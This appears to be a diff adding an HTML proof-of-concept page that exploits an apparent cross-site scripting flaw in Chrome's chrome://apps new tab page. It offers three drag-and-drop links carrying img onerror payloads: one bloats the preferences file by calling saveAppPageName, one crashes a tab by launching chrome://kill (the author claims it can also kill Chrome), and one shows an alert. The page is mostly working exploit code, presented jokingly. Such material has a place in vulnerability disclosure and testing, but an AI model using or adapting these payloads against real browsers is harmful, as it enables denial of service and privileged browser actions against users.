@@ -1,0 +1,29 @@
+<style>
+    img {
+        max-width: 1;
+        max-height: 1;
+    }
+</style>
+<p>
+    Got too much disk space? Drag this to
+    <code>chrome://apps</code> (NTP) and you won't have that problem any more:
+    <br>
+    <a href="https://example.com">
+        <img src onerror="if(window.ntp){chrome.send('saveAppPageName', ['lala', 1e6])}"> Innocent disk eater
+    </a> (don't worry, this only adds a few megabytes to your preferences file).
+
+    <p>
+        Is Chrome too stable? Drag this to
+        <code>chrome://apps</code> (NTP) and you can't complain any more:
+        <br>
+        <a href="https://example.com">
+            <img src onerror="if(window.ntp){chrome.send('launchApp', ['ahfgeienlihckogmohjhadlkjgocpleb', 0, 'chrome://kill'])}"> open URLs that can normally not be opened by the renderer
+        </a> (don't worry, this just crashes a tab. But I can also quit/restart/kill Chrome).
+
+        <p>
+            Boring demonstration of XSS; Drag this to
+            <code>chrome://apps</code> (NTP):
+            <br>
+            <a href="https://example.com">
+                <img src onerror="if(window.ntp){alert('XSS at ' + document.URL)}"> Shows alert dialog
+            </a>
